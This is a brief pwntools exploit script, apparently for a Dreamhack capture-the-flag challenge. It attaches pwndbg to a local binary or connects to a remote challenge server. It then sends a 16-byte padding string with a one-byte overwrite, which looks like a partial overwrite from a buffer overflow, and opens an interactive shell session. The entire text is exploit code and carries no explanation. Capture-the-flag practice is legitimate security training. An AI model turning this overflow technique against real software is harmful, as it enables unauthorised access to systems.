from pwn import *

if args.LOCAL:
    io=process('./prob')
    cmd="""
    init-pwndbg
    """
    gdb.attach(io, cmd)
else:
    io=remote('host3.dreamhack.games', 18592)
elf=context.binary=ELF('./prob')

pause()
io.sendline(b'A'*16+p8(0x10)) 
io.interactive()